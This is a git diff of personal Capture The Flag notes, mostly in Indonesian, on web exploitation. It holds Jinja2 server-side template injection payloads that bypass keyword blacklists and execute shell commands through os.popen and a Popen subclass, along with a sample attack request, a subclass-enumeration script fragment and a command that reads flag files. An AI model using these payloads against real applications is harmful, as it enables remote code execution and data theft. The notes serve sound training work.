@@ -1,13 +1,14 @@
 ---
-title: "My CTF - Notes"
-description: ""
-pubDate: 2025-07-25 10:00
+title: "CTF Field Notes"
+description: "A personal collection of techniques, payloads, and specialized commands for various Capture The Flag challenges."
+pubDate: 2025-07-25 10:00:00
 slug: "ctf-notes"
 category: "Web Exploitation"
+type: "note"
 ---
 
 - [Web](#web)
-    1. [SSTI](#ssti)
+  1. [SSTI](#ssti)
 
 Ini adalah catetan saya yang dibuat secara personal berdasarkan pengalaman saya yang telah mengerjakan ctf selama ini
 
@@ -26,11 +27,12 @@ def security_filter(user_input):
     if word in user_input:
         return False
  return True
- ```
+```
 
- payload untuk bypass : `{{url_for.__globals__.os.popen(request.headers.tel).read()}}`
+payload untuk bypass : `{{url_for.__globals__.os.popen(request.headers.tel).read()}}`
 
- req header:
+req header:
+
 ```txt
 POST /search HTTP/1.1
 Host: 103.160.212.3:1339
@@ -53,12 +55,12 @@ Connection: keep-alive
 
 query={{url_for.__globals__.os.popen(request.headers.tel).read()}}
 ```
+
 atau bisa juga
+
 ```txt
 {{url_for.__globals__.os.popen(request.args.a).read()}}
 ```
-
-
 
 ---
 
@@ -76,7 +78,6 @@ The regex expression is `/^[0–9a-z ]+$/i`
 The Regex filter bypass is:
 
 `/(\b)(on\S+)(\s*)=|javascript|<(|\/|[^\/>][^>]+|\/[^>][^>]+)>|({+.*}+)/`
-
 
 ```
 
@@ -99,15 +100,17 @@ blacklists =['os', 'sys', 'import','subprocess', 'shutil', 'tempfile', 'pickle',
             'chroot', 'link', 'lchown', 'listdir', 'lstat', 'mkdir', 'makedirs',
             'mkfifo', 'mknod', 'open', 'openpty', 'remove', 'removedirs',
             'rename', 'renames', 'rmdir', 'stat', 'symlink', 'unlink', 'walk', 'write',
-            'popen', 'builtins', 'global'] 
+            'popen', 'builtins', 'global']
 ```
 
 pertama cari dulu class2 nya pake ini:
+
 ```
 {{ dict.__base__.__subclasses__()[50:100] }}
 ```
 
 intinya kita harus dapetin class seperti `Popopen` buat bisa ngelakuin command, nah kita harus cari di index mana, jadi bisa pake script ini buat nyari biar ga cape nge brute:
+
 ```py
 import requests
 from bs4 import BeautifulSoup
@@ -167,4 +170,3 @@ tapi untuk chall ini, letak flag di letakkan di luar main dir `/app`, sedangkan 
 ```
 {{ dict.__base__.__subclasses__()[371]("for f in /?*.txt; do cat $f; done", shell=True, stdout=-1).communicate() }}
 ```
-
